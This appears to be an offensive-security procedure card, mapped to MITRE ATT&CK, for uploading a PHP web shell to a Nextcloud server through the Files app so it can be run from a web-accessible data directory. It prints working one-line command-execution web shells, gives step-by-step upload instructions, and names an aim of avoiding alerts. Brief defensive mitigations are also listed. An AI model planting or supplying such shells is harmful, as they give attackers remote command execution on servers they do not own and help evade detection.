---
tags:
  - file-upload
  - php
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Remote File Copy]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 72c3d3e2-7962-4f03-b3dc-8e1695860db5
created_at: '2025-12-14T17:23:24.052Z'
updated_at: '2025-12-14T17:23:24.052Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-PHP-Script-to-Nextcloud

## Summary

This procedure uploads a malicious PHP script via Nextcloud's file upload feature, storing it in the user's data directory for later direct execution.

## Description

Targeting Nextcloud's default setup where /data/<username>/files/ is web-accessible, this uploads a PHP file like 'shell.php' containing code such as <?php system($_GET['cmd']); ?>. Prerequisites include an authenticated session. Outcomes enable RCE if accessed directly, bypassing protections.

## Requirements

1. Authenticated Nextcloud session as non-admin user
2. Malicious PHP payload crafted (e.g., simple command executor)
3. Access to Files app in Nextcloud interface

## Defense

Defensive measures and detection strategies:

- Move data directory outside web root (e.g., /var/www/nextcloud/data to /home/nextcloud/data)
- Enable .htaccess rules to block PHP execution in data directory (e.g., <Files *.php> deny from all </Files>)
- Scan uploads for malicious content using antivirus or WAF

## Objectives

1. Place executable payload in accessible location
2. Prepare for direct URL execution
3. Test upload without triggering alerts

## Instructions

### Step 1: Navigate to Files App

**Context**: Access the upload interface post-login.

From the dashboard, click on 'Files' to open the file management view.

> The empty or existing files list loads.

### Step 2: Upload PHP File

**Context**: Transfer the malicious script to the server.

Click 'Upload' > 'Files', select 'shell.php' with payload like <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>, and confirm upload.

> Upload succeeds; file appears in /data/attacker/files/shell.php.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[file-upload]]
- [[php]]
- [[rce]]
